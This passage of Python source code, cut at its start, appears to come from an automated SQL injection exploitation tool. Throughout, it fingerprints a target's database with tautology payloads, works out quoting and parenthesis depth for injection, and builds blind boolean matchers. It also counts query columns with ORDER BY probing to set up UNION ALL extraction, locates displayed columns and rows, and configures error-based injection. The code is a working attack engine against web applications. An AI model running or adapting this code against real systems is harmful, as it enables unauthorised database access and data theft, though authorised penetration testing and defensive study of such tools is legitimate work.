            CurrentMethodConfigurator = SomeMethod.get_configurator()
            configurator = CurrentMethodConfigurator(
                self.design,
                dbms,
                quoter,
                injector,
                matchers,
                SomeMethod,
                status=self.status,
            )

            try:
                await configurator.configure()
            except ConfigurationException:
                pass
            else:
                break
        else:
            self.status.section("Injection method", "Configuring injection method")
            raise ConfigurationException("Unable to configure an injection method")

    def _load_dbms_modules(self) -> None:
        self.dbms_modules = [
            importlib.import_module(f"{db.__name__}.{module.name}")
            for module in iter_modules(db.__path__)
            if module.name != "generic"
        ]

    async def fingerprint_dbms(self, oracle: ErrorOracle):
        """Finds out the DBMS used by the server by sending DBMS-specific tautologies."""
        names = [module.__name__.rsplit(".", 1)[-1] for module in self.dbms_modules]
        self.logger.debug("Fingerprinting DBMS candidates: %s", ", ".join(names))
        try:
            dbms = await anext(
                (
                    module
                    for module in self.dbms_modules
                    if await oracle.test(module.Features.tautology)
                )
            )
        except StopAsyncIteration:
            raise ConfigurationException("Unable to determine DBMS") from None

        self.logger.info("Found DBMS: %s [%s]", dbms.Features.name, dbms.__name__)
        return dbms

    async def determine_quoting(self, oracle: ErrorOracle, dbms: ModuleType):
        """Determines quoting function by building a Compiler and checking that a string
        has the correct length.
        """
        quoters = dbms.Features.quoters
        names = [quoter.__name__ for quoter in quoters]
        self.logger.debug("Fingerprinting quoting candidates: %s", ", ".join(names))

        # Test each quoting method with a `LEN(X) = Y` condition
        for quote in quoters:
            compiler = dbms.Compiler(quote=quote)
            test_length = Length(Value(self.SPECIAL_VALUE)) == len(self.SPECIAL_VALUE)
            test_length = str(compiler.wrap(test_length))
            if await oracle.test(test_length):
                break
        else:
            raise ConfigurationException("Unable to determine SQL quoting mechanism")

        self.logger.info(f"Found SQL quoting mechanism: %s", quote.__name__)

        return quote

    async def _get_matchers_from_injector(
        self, injector: Injector, builder: StabilizedMatchersBuilder
    ) -> StabilizedMatcherMap:
        # Send payloads for every outcome
        # Here, the syntax of the payloads is different from the baseline
        # ones; for instance, the additional error payloads are not syntax
        # errors but should produce an error because the "XYZ99" and "ABC"
        # columns do not exist.
        # For success messages, we have something like `' AND <tautology>`.
        # For failure messages, something like `' AND <contradiction>`.

        class InjectedStabilizedMatchersBuilder(StabilizedMatchersBuilder):
            async def generate_success(self, i: int) -> bytes:
                return await injector(RNG.tautology())

            async def generate_failure(self, i: int) -> bytes:
                return await injector(RNG.contradiction())

            async def generate_error(self, i: int) -> bytes:
                return await injector(
                    f"{randomized.alpha(1)}{RNG.tautology()}{randomized.alpha(1)}"
                )

        builder = InjectedStabilizedMatchersBuilder(parent=builder)
        return await builder.build()

    async def get_injector_and_matchers(
        self,
    ) -> tuple[Injector, MatcherMap]:
        send = self._send

        # We have a base value: try to differenciate success, failure, and error
        if self.base_value is not ConfiguratorEmptyValue:
            value = str(self.base_value)

            class BaselineMatchersBuilder(StabilizedMatchersBuilder):
                async def generate_success(self, i: int) -> bytes:
                    return await send(value)

                async def generate_failure(self, i: int) -> bytes:
                    return await send(f"{value}{RNG()}")

                async def generate_error(self, i: int) -> bytes:
                    return await send(
                        f"{randomized.alpha(1)}'{randomized.alpha(1)}\"{randomized.alpha(1)}\\"
                    )

        # No base value: we cannot differenciate between success and failure
        else:

            class BaselineMatchersBuilder(StabilizedMatchersBuilder):
                DIRECTIONS = [("failure", "error", True)]

                async def generate_success(self, i: int) -> bytes:
                    raise RuntimeError("Unused")

                async def generate_failure(self, i: int) -> bytes:
                    return await send(f"{RNG()}")

                async def generate_error(self, i: int) -> bytes:
                    return await send(
                        f"{randomized.alpha(1)}'{randomized.alpha(1)}\"{randomized.alpha(1)}\\"
                    )

        builder = BaselineMatchersBuilder()
        matchers = await builder.build()

        # No matchers: can we push through anyways?
        if not any(matchers.values()):
            if not self.risky:
                raise ConfigurationException(
                    "Unable to distinguish outcomes; not injectable ?"
                )
            self.status.warning("Unable to distinguish outcomes")
            self.status.warning("Proceeding with **risky** mode")
        else:
            self.logger.info(
                "Found baseline matchers for: %s", format_matchers(matchers)
            )

        # Baseline matchers may be too narrow; for instance, the error payloads are
        # only syntax errors. As a result, the generated matcher here could be
        # "Syntax error". We need to generate a new kind of error and make a matcher
        # from both. To do so, we need to know the basic injection syntax, which is
        # generally something like `' AND 'a'='a`. We do this in the next block.

        matched = None
        quotes = ["", "'", '"']

        value = self.base_value if self.base_value is not ConfiguratorEmptyValue else ""

        # TODO If in risky mode, we should try to inject with comments as well. The idea
        # is that we can still have negative conditions, even despite the OR <tautology>
        # close, because we can have another condition that comes after the injection
        # and that is always false. Example: WHERE ... OR 1=1 AND <condition> AND 1=0
        # If we do use comments, we need to reflect it when configuring UNION injections
        # which also use comments.

        # Try with 0, 1, or 2 parentheses, and with or without quotes
        for nb_parentheses in range(3):
            for quote in quotes:
                self.logger.debug(
                    "Testing injection with nb_parentheses=%d and quote=%r",
                    nb_parentheses,
                    quote,
                )
                injector = ConditionInjector(
                    self._send, value, nb_parentheses, quote, self.risky
                )
                merged_matchers = await self._get_matchers_from_injector(
                    injector, builder
                )

                # We got something !
                if any(merged_matchers.values()):
                    self.logger.info(
                        "Found matchers for nb_parentheses=%d and quote=%r: %s",
                        nb_parentheses,
                        quote,
                        format_matchers(merged_matchers),
                    )

                    if merged_matchers["success", "failure"]:
                        return injector, merged_matchers

                    # A difference between success and failure is very nice, as it
                    # leaves a way for UNION injections. We'll try to iterate through
                    # with more parentheses to see if we can get closer to the main
                    # query.
                    # For instance, a query like this:
                    # SELECT * FROM users WHERE id IN (<INJ>)
                    # might produce matchers with nb_parentheses=0, but it'd produce
                    # better matchers with it set to 1.
                    quotes = [quote]
                    matched = injector, merged_matchers
                    break

        if matched:
            self.logger.debug("Unable to improve injection")
            return matched

        # Last resort: we inject "raw", hoping Design.send() actually formats the
        # payload itself

        formatters = [
            "{condition}",
            "({condition})",
        ]
        if self.base_value is not ConfiguratorEmptyValue:
            formatters = [
                "{value},({condition})",
                "{value}-({condition})",
            ] + formatters

        for formatter in formatters:
            self.logger.debug("Testing in-place injection: %r", formatter)
            injector = FormatInjector(self._send, self.base_value, formatter)

            merged_matchers = await self._get_matchers_from_injector(injector, None)

            if any(merged_matchers.values()):
                self.logger.info(
                    "In-place injection worked: %s", format_matchers(merged_matchers)
                )
                return injector, merged_matchers

        raise ConfigurationException(
            "Unable to determine a way to inject; not injectable ?"
        )

    def setup_dbms(self, dbms: ModuleType, quoter: QuoteCallable) -> None:
        """Creates the methods that set the compiler and the mapper."""
        base_name = dbms.__name__.rsplit(".", 1)[-1]

        editor = self.editor
        editor.set_import_from("ending.util", "quoting")

        self.create_import_for_dbms(base_name)

        editor.set_method(
            "set_compiler",
            f"""
async def set_compiler(self) -> Compiler:
    return Compiler(quote=quoting.{quoter.__name__})
""",
        )
        editor.set_method(
            "set_mapper",
            f"""
async def set_mapper(self) -> Mapper:
    return Mapper(self.method)
""",
        )


class MethodConfigurator(Configurator, ABC):
    """Base class for method configurators.

    A method configurator is in charge of configuring the injection method, i.e. the
    class that will be used to inject SQL expressions.

    Such a configurator determines, along the `MethodConfigurator.configure` method, the
    parameters of the injection method, and other variables such as a way to format the
    payload, a pattern to match, etc.
    """

    dbms: ModuleType
    quoter: QuoteCallable
    injector: Injector
    matchers: MatcherMap
    compiler: Compiler
    """Compiler object."""
    Method: type[Method]
    """Method class."""

    formatter: str
    """A format string that contains a `{payload}` placeholder. Set by
    `MethodConfigurator.configure`.
    """
    parameters: dict[str, Any]
    """Method parameters. This dict is built along the way, as parameters are found.
    """

    def __init__(
        self,
        design: Design,
        dbms: ModuleType,
        quoter: QuoteCallable,
        injector: Injector,
        matchers: MatcherMap,
        Method: type[Method],
        *,
        status: LiveStatus = None,
    ) -> None:
        super().__init__(design, status=status)
        self.dbms = dbms
        self.quoter = quoter
        self.injector = injector
        self.matchers = matchers
        self.Method = Method
        self.parameters = {}
        self.compiler = self.get_compiler()

    def get_compiler(self) -> Compiler:
        return self.dbms.Compiler(self.quoter)

    async def inject(self, payload: Node) -> bytes:
        self.compiler.wrap(payload)
        payload = self.formatter.format(payload=payload, condition=payload)
        return await self.injector.send(payload)

    def get_method(self, **parameters) -> Method:
        """Returns a `Method` instance."""
        parameters |= self.parameters
        return self.Method(self.compiler, self.inject, **parameters)

    def update_design(self) -> None:
        """Creates `Design.inject` and `Design.set_method`."""
        self.create_inject()
        self.create_set_method()

    def create_inject(self) -> None:
        """Creates the `inject()` method in the `Design` class that returns bytes, for
        text-based injections.
        """
        self.editor.set_method(
            "inject",
            f"""
async def inject(self, payload: Node) -> bytes:
    payload = f{self.formatter!r}
    return await self.send(payload)
""",
            after="send",
        )

    def create_set_method(self):
        """Creates the `set_method()` method in the `Design` class using the parameters
        from `MethodConfigurator.parameters`.
        """
        module = self.dbms.__package__
        module_parent, module_name = module.rsplit(".", 1)

        repr_arguments = "".join(
            f"        {k}={v!r},\n" for k, v in self.parameters.items()
        )

        self.create_import_for_dbms(module_name)
        self.editor.set_method(
            "set_method",
            f"""
async def set_method(self) -> Method:
    return {self.Method.__name__}(
        self.compiler,
        self.inject,
{repr_arguments}    )
""",
        )
        with_arguments = (
            self.parameters and f" with arguments {self.parameters!r}" or ""
        )
        self.logger.info(
            f"Set injection method to {self.Method.__name__}{with_arguments}"
        )
        self.status.success(f"Set injection method to **{self.Method.__name__}**")

    @abstractmethod
    async def _verify(self) -> None:
        """Determines if the method works by running a simple query.
        Raises `ConfigurationError` in case of a problem.
        """

    async def _fetch_value(self, query: Query, **params) -> None:
        """Tries to fetch a single value using the current injection method parameters.
        If it fails, `None` is returned.
        """
        method = self.get_method(**params)
        try:
            results = await method.fetch(query)
        except InjectionError as e:
            self.logger.warning(f"Unable to fetch results with configured method: {e}")
            return None

        try:
            return results.data[0][0]
        except IndexError:
            return None


class TestMethodConfigurator(MethodConfigurator):
    """Configures a `TestMethod` by picking the best matcher."""

    formatter: str
    """A format string that contains a `{condition}` placeholder. Set by `_configure`."""
    pattern: re.Pattern[bytes]
    """A pattern that matches the response of the server."""
    should_match: bool
    """If true, the pattern must not match."""

    async def _configure(self) -> None:
        """Sets `formatter`, `pattern`, and `negate` and tests the injection by querying
        true/false.
        """
        self.status.section(
            "Injection method: BLIND", f"Configuring {self.Method.__name__}"
        )

        # Try and keep it simple if we can: try to use a success->failure matcher
        (outcome_from, outcome_to), matcher = get_best_matcher(self.matchers, "failure")

        self.status.info(f"Using *{outcome_from}->{outcome_to}* matcher")

        self.pattern = matcher.to_pattern()
        self.logger.debug(
            "Verifying test based injection with %s->%s matcher",
            outcome_from,
            outcome_to,
        )

        match (outcome_from, outcome_to):
            case ("success", "failure"):
                self.should_match = matcher.is_positive()
                # We can just insert the condition in the payload
                self.formatter = self.injector.allow_condition().build_payload(
                    "{condition:p}"
                )
                await self._verify()
            case (_, "error"):
                if outcome_from == "success":
                    injector = self.injector.allow_condition()
                else:
                    injector = self.injector.enforce_failure()
                self.should_match = not matcher.is_positive()

                # This case is the most annoying: we might insert error_condition in a
                # WHERE that already returns zero results, or matches every row in the
                # result set. In this case, the condition we insert in the payload
                # would often be optimized out by the DBMS, and not get executed. We
                # make tests to ensure that the condition is executed.

                for result, operator in ((1, "AND"), (0, "OR")):
                    formatter = self.dbms.Features.error_condition.format(
                        condition="{condition:p}", result=result
                    )
                    self.formatter = injector.build_payload(
                        formatter, operator=operator
                    )

                    try:
                        await self._verify()
                    except ConfigurationException:
                        pass
                    else:
                        break
                else:
                    raise ConfigurationException(
                        "Unable to configure test-based injection"
                    )

        self.update_design()

    async def _verify(self) -> None:
        """Determines if the method works by running two boolean queries. Raises
        `ConfigurationException` in case of a problem.
        """
        queries = [
            Query().columns(Value(True)),
            Query().columns(Value(False)),
        ]
        results = await asyncio.gather(*map(self._fetch_value, queries))

        if results == [True, False]:
            return

        self.logger.debug(
            "Verification of test method returned {results!r} instead of [True, False]"
        )

        raise ConfigurationException(f"Unable to configure **{self.Method.__name__}**")

    async def inject(self, condition: Node) -> bool:
        """Creates the `inject()` method that returns a boolean for test-based
        injections in the `Design` class.
        """
        response = await super().inject(condition)
        result = self.pattern.search(response) is not None
        return result ^ (not self.should_match)

    def create_inject(self) -> None:
        """Creates the `inject()` method that returns a boolean for test-based
        injections in the `Design` class.
        """
        negate_code = "not " if self.should_match else ""
        self.editor.set_import("re")
        self.editor.set_attribute(
            "pattern",
            "re.Pattern",
            self.pattern.pattern,
            "re.compile({value!r}, re.DOTALL)",
        )
        self.editor.set_method(
            "inject",
            f"""
async def inject(self, condition: Node) -> bool:
    payload = f{self.formatter!r}
    response = await self.send(payload)
    return self.pattern.search(response) is {negate_code}None
""",
            after="send",
        )


class DisplayMethodConfigurator(MethodConfigurator):
    """Base configurator for display methods."""

    async def _configure_hex(self) -> None:
        """Sets, if possible, the `hex` parameter. Returns `True` if it came to a
        conclusion, `False` otherwise.
        """
        hex = await self._requires_hex()

        match hex:
            case None:
                self.status.warning("Unable to determine if hex should be enabled")
                self.logger.warning(f"Unable to determine if hex should be enabled")
                return False
            case True:
                self.status.info("Retrieving **using** hexadecimal encoding")
            case False:
                self.status.info("Retrieving **without** hexadecimal encoding")

        self.parameters["hex"] = hex
        self.logger.info(f"Hexadecimal set to {self.parameters['hex']}")
        return True

    async def _verify(self) -> None:
        # If the method came to a conclusion, it means that it was able to retrieve
        # results: no need to check again
        # TODO Move this to HexDisplayMethodConfigurator
        if issubclass(self.Method, HexDisplayMethod) and await self._configure_hex():
            return

        value = randomized.string(10)
        query = Query().columns(Value(value))
        result = await self._fetch_value(query)

        if result is None:
            pass
        elif value == result:
            return
        elif value.lower() == result.lower():
            self.status.warning("Results are case-insensitive")
            return

        raise ConfigurationException(f"Unable to configure **{self.Method.__name__}**")

    async def _requires_hex(self) -> bool:
        """Determines if the method works with or without hexadecimal."""
        query = Query().columns(Value(self.SPECIAL_VALUE))

        result = await self._fetch_value(query, hex=False)
        if result == self.SPECIAL_VALUE:
            return False

        result = await self._fetch_value(query, hex=True)
        if result == self.SPECIAL_VALUE:
            return True

        return None


class SelectMethodConfigurator(DisplayMethodConfigurator):
    """Configures the `SelectMethod` injection method. The UNION injection requires
    knowledge of:
        - potentially, a comment to trim the previous query,
        - the number of columns in the query,
        - a column which is displayed in the response,
        - the number of rows displayed at once,
        - the value of dummy columns.
    """

    async def _configure(self) -> None:
        # TODO Get number of columns without ORDER BY

        self.status.section("Injection method: UNION", "Configuring UNION injection")
        oracle = ErrorOracle.build(self.injector, self.matchers)
        self.injector = oracle.injector

        for comment in [" -- -", "#", ""]:
            try:
                nb_columns, matcher = await self._test_nb_columns_with_comment(comment)
            except ConfigurationException:
                self.logger.debug("UNION: Unable to configure for comment %r", comment)
            else:
                break
        else:
            raise ConfigurationException("Unable to determine number of columns")

        self.logger.debug(
            "UNION: Statement has %d columns (comment=%r)",
            nb_columns,
            comment,
        )

        dummy_column = await self._validate_nb_columns(matcher, comment, nb_columns)

        # Now that we have the number of rows, we can safely discard the results from
        # the previous query
        self.injector = self.injector.enforce_failure()

        self.logger.debug("UNION: Dummy column is %r", dummy_column)
        self.status.info(f"Comment: `{comment}`")
        self.status.info(f"Number of columns: **{nb_columns}**")
        self.status.info(f"Dummy column: `{dummy_column}`")

        self.formatter = self.injector.build_payload(
            suffix=f" UNION ALL {{payload}}{comment}"
        )
        self.parameters.update(
            {
                "columns": nb_columns,
                "dummy_column": dummy_column,
            }
        )

        self.parameters["column"] = await self._find_displayed_column()
        self.parameters["nb_rows"] = await self._find_nb_rows()

        await self._verify()
        self.update_design()

    async def _validate_nb_columns(
        self, matcher: Matcher, comment: str, nb_columns: int
    ) -> Value:
        """For the given number of columns, tries to find a dummy column that works."""
        for column in map(Value, [None, 1, "1"]):
            columns = [column] * nb_columns
            query = Query().columns(*columns).where(Value(RNG()) == Value(RNG()))
            self.compiler.wrap(query)
            # TODO Make sure that it gets displayed? the query might be valid but might
            # chose not to display the data because of the value of the dummy field
            # For instance it might check that field 1 is not null to display field 2
            # on the page
            # TODO Especially if we determine the displayed column in one request
            # afterwards; this needs to be integrated to the find_displayed_column
            response = await self.injector(suffix=f" UNION ALL {query}{comment}")
            if not matcher.matches(response):
                return column

        # The validation failed, but we know that the ORDER BY worked
        # This seems like something we can't handle
        raise ConfigurationException("Unable to find dummy column")

    async def _test_nb_columns_with_comment(self, comment: str) -> bool:
        """Tests the number of columns in the query by sending ORDER BY queries.
        If a number seems to work, we try to validate it by sending a UNION query with
        different dummy columns, until one works. Returns the number of columns and
        the value of the dummy column.
        """
        inject = self.injector

        # A matcher based on success is not that good, because the ORDER BY might
        # reorder the results and make the matcher fail. We are looking for a matcher
        # that either matches on error, or from failure

        class OrderByStabilizedMatchersBuilder(StabilizedMatchersBuilder):
            DIRECTIONS = [
                ("error", "failure", True),
                ("error", "success", False),
            ]

            async def generate_success(self, i: int) -> bytes:
                if i == 0:
                    return await inject()
                rows = ["1"] * (1 + (i % 5))
                rows = ",".join(rows)
                return await inject(suffix=f" ORDER BY {rows}{comment}")

            async def generate_failure(self, i: int) -> bytes:
                sface = inject.enforce_failure()
                if i == 0:
                    return await sface()
                rows = ["1"] * (1 + (i % 5))
                rows = ",".join(rows)
                return await sface(suffix=f" ORDER BY {rows}{comment}")

            async def generate_error(self, i: int) -> bytes:
                if i == 0:
                    return await inject(suffix=f" d'e\"f\\ {comment}")
                rows = ["1"] * (i % 5)
                rows.append(f"{RNG()}")
                rows = ",".join(rows)

                if i % 2:
                    specialized = inject.enforce_failure()
                else:
                    specialized = inject.allow_condition()
                return await specialized(suffix=f" ORDER BY {rows}{comment}")

        builder = OrderByStabilizedMatchersBuilder()
        matcher = await builder.get("error", "failure")

        if matcher:
            self.injector = self.injector.enforce_failure()
        else:
            matcher = await builder.get("error", "success", allow_negative=False)

        if not matcher:
            raise ConfigurationException(
                f"Unable to get matcher for ORDER BY with comment {comment!r}"
            )

        self.logger.debug("Got base matcher for ORDER BY with comment %r", comment)

        GROWTH = 8
        max_nb_columns = 0

        # Find out the maximum number of columns by gradually incrementing the ORDER BY
        # number

        while max_nb_columns < 300:
            GROWTH *= 2
            max_nb_columns += GROWTH
            columns = ",".join(map(str, range(1, min(3, max_nb_columns))))

            response = await self.injector(
                suffix=f" ORDER BY {columns},{max_nb_columns}{comment}"
            )
            if matcher.matches(response):
                break

        # The range is [min_nb_columns, max_nb_columns)
        min_nb_columns = max_nb_columns - GROWTH or 1

        self.logger.debug(
            "UNION: There are between %d and %d columns (comment: %r)",
            min_nb_columns,
            max_nb_columns,
            comment,
        )

        # Use dichotomy to find the exact number of columns

        while min_nb_columns + 1 < max_nb_columns:
            test_nb_columns = min_nb_columns + (max_nb_columns - min_nb_columns) // 2
            self.logger.debug("UNION: Trying with %d columns", test_nb_columns)
            columns = ",".join(map(str, range(1, min(3, max_nb_columns))))

            response = await self.injector(
                suffix=f" ORDER BY {columns},{test_nb_columns}{comment}"
            )
            if matcher.matches(response):
                max_nb_columns = test_nb_columns
            else:
                min_nb_columns = test_nb_columns

        return min_nb_columns, matcher

    def _build_marker_query_for_all_columns(self) -> tuple[Query, re.Pattern[bytes]]:
        tag = randomized.lower(4)
        columns = [
            self._split_tag(f"{tag}{i}m") for i in range(self.parameters["columns"])
        ]
        query = Query().columns(*columns)
        self.compiler.wrap(query)
        pattern = re.compile(rf"{tag}([0-9]+)m".encode(), flags=re.IGNORECASE)
        return query, pattern

    def _build_marker_query_for_single_column(
        self, column: int
    ) -> tuple[Query, re.Pattern[bytes]]:
        tag = randomized.lower(4)
        columns = [
            self.parameters["dummy_column"] for _ in range(self.parameters["columns"])
        ]
        columns[column] = self._split_tag(tag)
        query = Query().columns(*columns)
        self.compiler.wrap(query)
        pattern = re.compile(tag.encode(), flags=re.IGNORECASE)
        return query, pattern

    def _split_tag(self, tag: str) -> Concatenation:
        """Splits given value in two and concatenates it. This is done because said
        value is meant to be matched in the response, so if the injected param is
        displayed on the page, we must make sure we don't match it.
        """
        return Concatenation((Value(tag[:1]), Value(tag[1:])))

    async def _find_displayed_column(
        self,
    ) -> int:
        """Determine the column that gets displayed by issuing a UNION query with
        markers and looking for them in the response.
        """
        try:
            return await self._find_displayed_column_fast()
        except ConfigurationException:
            self.logger.debug("UNION: Unable to find displayed column with fast method")
        return await self._find_displayed_column_iterative()

    async def _find_displayed_column_fast(self) -> int:
        """Determine the column that gets displayed by issuing a UNION query with
        markers and looking for them in the response.
        """
        query, pattern = self._build_marker_query_for_all_columns()
        result = await self.inject(query)
        match = pattern.search(result)

        if not match:
            raise ConfigurationException("Unable to find a displayed column")

        if (count := result.count(match.group(0))) > 1:
            self.logger.warning("Result is present more than once: %d times", count)

        column = int(match.group(1))

        self.status.info(f"Displayed column: **#{column}**")
        self.logger.debug("UNION: Found displayed column using fast method: %d", column)

        return column

    async def _find_displayed_column_iterative(
        self,
    ) -> int:
        for column in range(self.parameters["columns"]):
            query, pattern = self._build_marker_query_for_single_column(column)
            result = await self.inject(query)
            if pattern.search(result):
                break
        else:
            raise ConfigurationException("Unable to find a displayed column")

        self.status.info(f"Displayed column: **#{column}**")
        self.logger.debug("UNION: Found displayed column using slow method: %d", column)

        return column

    async def _find_nb_rows(
        self,
    ) -> int:
        """Determine nb_rows by issuing several UNION queries at once, hoping for them
        both to be displayed.
        """
        for nb_rows in (100, 10, 5, 2):
            tag = randomized.lower(6)
            subquery = [Value(f"{tag}{i:03d}m") for i in range(nb_rows)]
            subquery[0] = Alias(subquery[0], f"{tag}c")
            subquery = [Query().columns(column) for column in subquery]
            subquery = functools.reduce(Union, subquery)
            columns = [self.parameters["dummy_column"]] * self.parameters["columns"]
            columns[self.parameters["column"]] = Identifier(f"{tag}c")
            query = Query(Alias(subquery, f"{tag}t")).columns(*columns)

            self.compiler.wrap(query)

            result = await self.inject(query)
            if matches := re.findall(rf"{tag}(\d+)m".encode(), result, flags=re.I):
                matches = set(map(int, matches))
                minimum = min(matches)
                maximum = max(matches)
                nb_rows = len(matches)
                if maximum - minimum != nb_rows - 1:
                    continue
                break
        else:
            nb_rows = 1

        match nb_rows:
            case 1:
                qualificative = "A **single** row is displayed at once"
            case 100:
                qualificative = f"At least **{nb_rows} rows** are displayed at once"
            case _:
                qualificative = f"At most **{nb_rows} rows** are displayed at once"

        self.logger.debug("UNION: Found number of rows: %d", nb_rows)
        self.status.info(qualificative)

        return nb_rows


class ErrorBasedMethodConfigurator(DisplayMethodConfigurator):
    """Configures an `ErrorBasedMethod` injection method by simply verifying that it
    works.
    """

    async def _configure(self) -> None:
        self.status.section(
            "Injection method: ERROR", f"Configuring {self.Method.__name__}"
        )
        self.injector = self.injector.allow_condition()
        self.formatter = self.injector.build_payload("{payload:p}")
        await self._verify()

        self.update_design()
        self.logger.info("Set injection method to %s", self.Method.__name__)


def get_best_matcher(
    matchers: MatcherMap, outcome: OutcomeType = None
) -> tuple[MatcherType, Matcher]:
    """Gets the matcher that distinguishes an outcome from given outcome.
    If several such matchers exist, the "success" one is returned.
    If no such matcher exists, returns the first matcher it can find.
    """
    for _from in OutcomeType.__args__:
        if _from == outcome:
            continue

        try:
            matcher = matchers[(_from, outcome)]
        except KeyError:
            continue

        if matcher:
            return (_from, outcome), matcher

    return next((k, v) for k, v in matchers.items() if v)
